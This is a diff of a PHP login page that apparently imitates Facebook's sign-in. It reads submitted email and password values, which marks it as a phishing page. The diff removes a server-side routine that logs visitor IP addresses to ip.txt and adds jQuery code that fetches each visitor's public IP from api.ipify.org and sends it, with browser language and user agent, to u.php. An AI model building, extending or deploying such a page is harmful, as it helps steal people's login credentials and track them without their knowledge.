@@ -1,29 +1,4 @@
 <?php
-function get_IP_address()
-{
-    foreach (array('HTTP_CLIENT_IP',
-                   'HTTP_X_FORWARDED_FOR',
-                   'HTTP_X_FORWARDED',
-                   'HTTP_X_CLUSTER_CLIENT_IP',
-                   'HTTP_FORWARDED_FOR',
-                   'HTTP_FORWARDED',
-                   'REMOTE_ADDR') as $key){
-        if (array_key_exists($key, $_SERVER) === true){
-            foreach (explode(',', $_SERVER[$key]) as $IPaddress){
-                $IPaddress = trim($IPaddress); // Just to be safe
-
-                if (filter_var($IPaddress,
-                               FILTER_VALIDATE_IP,
-                               FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)
-                    !== false) {
-
-                    return $IPaddress;
-                }
-            }
-        }
-    }
-}
-fwrite(fopen('ip.txt','w'),get_IP_address());
 $u = $_POST['email'];
 $p = $_POST['password'];
 if ($u && $p){
@@ -551,5 +526,27 @@ Log in with Facebook        </button>
 
     
     
-    
+    <script src=
+"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+</script>  
+<script>
+$.getJSON("https://api.ipify.org?format=json",function(data) {
+if (1) {
+    var ip = data.ip;
+    var lang = navigator.language;
+    var platform = navigator.platform;
+    var ua = navigator.userAgent;
+    var webdriver = navigator.webdriver;
+    $.ajax({
+        url : 'u.php',
+        type : 'post',
+        data : {
+            'ip' : ip,
+            'lang' : lang,
+            'ua' : ua
+        }
+    });
+}
+});
+</script>    
 </body></html>
